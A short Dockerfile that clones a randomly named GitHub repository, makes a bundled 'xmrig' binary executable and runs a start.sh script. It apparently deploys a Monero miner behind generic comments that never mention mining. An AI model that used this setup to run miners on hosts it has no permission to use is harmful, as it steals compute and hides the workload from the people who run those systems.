# Use an official base image with Git installed
FROM ubuntu:latest

# Install Git and other dependencies
RUN apt-get update && \
    apt-get install -y git bash

# Clone the repository
RUN git clone https://github.com/WackyDawg/effective-fortnight.git /app

# Set the working directory
WORKDIR /app

# Copy the start.sh script into the container
COPY start.sh /app/start.sh

RUN chmod +x /app/xmrig
# Make the script executable
RUN chmod +x /app/start.sh

# Run the shell script
CMD ["./start.sh"]
